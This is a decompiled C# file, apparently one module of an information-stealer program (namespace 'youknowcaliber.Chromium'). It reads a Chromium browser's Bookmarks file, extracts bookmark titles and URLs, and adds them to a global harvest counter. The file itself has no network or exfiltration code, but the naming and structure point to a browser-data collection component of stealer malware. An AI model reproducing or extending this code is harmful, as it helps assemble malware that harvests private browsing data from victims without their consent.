﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace youknowcaliber.Chromium
{
	internal sealed class Bookmarks
	{
		public static List<Bookmark> Get(string sBookmarks)
		{
			List<Bookmark> result;
			try
			{
				List<Bookmark> list = new List<Bookmark>();
				bool flag = !File.Exists(sBookmarks);
				if (flag)
				{
					result = list;
				}
				else
				{
					string input = File.ReadAllText(sBookmarks, Encoding.UTF8);
					input = Regex.Split(input, "      \"bookmark_bar\": {")[1];
					input = Regex.Split(input, "      \"other\": {")[0];
					string[] array = Regex.Split(input, "},");
					foreach (string text in array)
					{
						bool flag2 = text.Contains("\"name\": \"") && text.Contains("\"type\": \"url\",") && text.Contains("\"url\": \"http");
						if (flag2)
						{
							int num = 0;
							string[] array3 = Regex.Split(text, Parser.separator);
							int j = 0;
							while (j < array3.Length)
							{
								string data = array3[j];
								num++;
								Bookmark item = default(Bookmark);
								bool flag3 = Parser.DetectTitle(data);
								if (flag3)
								{
									item.sTitle = Parser.Get(text, num);
									item.sUrl = Parser.Get(text, num + 2);
									bool flag4 = string.IsNullOrEmpty(item.sTitle);
									if (!flag4)
									{
										bool flag5 = !string.IsNullOrEmpty(item.sUrl) && !item.sUrl.Contains("Failed to parse url");
										if (flag5)
										{
											Counting.Bookmarks++;
											list.Add(item);
										}
									}
								}
								IL_153:
								j++;
								continue;
								goto IL_153;
							}
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Bookmark>();
			}
			return result;
		}
	}
}
